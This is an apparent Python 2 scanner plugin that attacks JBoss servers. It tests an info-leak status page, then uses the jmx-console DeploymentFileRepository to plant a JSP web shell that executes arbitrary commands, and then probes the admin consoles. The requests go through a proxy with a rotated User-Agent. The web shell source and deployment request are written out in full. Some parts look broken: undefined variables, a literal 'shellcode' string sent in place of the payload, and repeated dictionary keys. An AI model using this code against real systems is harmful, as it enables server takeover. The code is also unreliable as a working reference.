# coding:utf-8
import logging
import lib.requests as requests
import random
from lib.config import (
    PASSWORD_DIC, MY_PROXY, USER_AGENT_LIST
)

def random_str(len): 
    str1="" 
    for i in range(len): 
        str1+=(random.choice("ABCDEFGH")) 
    return str1

def exploit(ip):
    result = []
    if Domain:
        for domain in Domain:
            vul_url1 = domain + '/status?full=true'
            try:
                resp = requests.get(vul_url1, timeout=TIME_OUT, proxies=MY_PROXY, headers={"User-Agent": random.choice(USER_AGENT_LIST)}, allow_redirects=True, verify=False)
                if resp.status_code == 200 and "Max processing time" in resp.text:
                    result.append('%s >>>> 存在Jboss信息泄漏漏洞'%vul_url1)
            except Exception,e:
                logging.error(e)
            shell="""<%@ page import="java.util.*,java.io.*"%> <% %> <HTML><BODY> <FORM METHOD="GET" NAME="comments" ACTION=""> <INPUT TYPE="text" NAME="comment"> <INPUT TYPE="submit" VALUE="Send"> </FORM> <pre> <% if (request.getParameter("comment") != null) { out.println("Command: " + request.getParameter("comment") + "<BR>"); Process p = Runtime.getRuntime().exec(request.getParameter("comment")); OutputStream os = p.getOutputStream(); InputStream in = p.getInputStream(); DataInputStream dis = new DataInputStream(in); String disr = dis.readLine(); while ( disr != null ) { out.println(disr); disr = dis.readLine(); } } %> </pre> </BODY></HTML>"""
            vul_url2 = domain + "/jmx-console/HtmlAdaptor"
            shellcode=""
            name=random_str(5)
            for v in shell:
                shellcode+=hex(ord(v)).replace("0x","%")
            params = {"action":"invokeOpByName","name":"jboss.admin%3Aservice%3DDeploymentFileRepository","methodName":"store","argType":"java.lang.String","arg0":name+".war","argType":"java.lang.String","arg1":name,"argType":"java.lang.String","arg2":".jsp","argType":"java.lang.String","arg3":"shellcode","argType":"boolean","arg4":"True"}
            try:
                resp = requests.head(vul_url2, params=params, timeout=TIME_OUT, proxies=MY_PROXY, headers={"User-Agent": random.choice(USER_AGENT_LIST)}, allow_redirects=True, verify=False)
                shell_url = "%s/%s.jsp"%(domain,name)
                resp = requests.get(shell_url, timeout=TIME_OUT, proxies=MY_PROXY, headers={"User-Agent": random.choice(USER_AGENT_LIST)}, allow_redirects=True, verify=False)
                if "comments" in resp.text:
                    result.append('%s >>>> 存在Jboss getshell漏洞 %s'%(vul_url2,shell_url))
            except Exception,e:
                logging.error(e)
            login = ["/admin-console/login.seam","/jmx-console","/console/App.html"]
            for login_uri in login:
                try:
                    resp = requests.get(domain+login_uri, timeout=TIME_OUT, proxies=MY_PROXY, headers={"User-Agent": random.choice(USER_AGENT_LIST)}, allow_redirects=True, verify=False)
                except Exception,e:
                    logging.error(e)
                    continue
                if "JBoss" in resp.text or resp.status_code == 401:
                        result.append('%s >>>> 存在Jboss管理口'%(domain+login_uri))
        if len(result):
            return result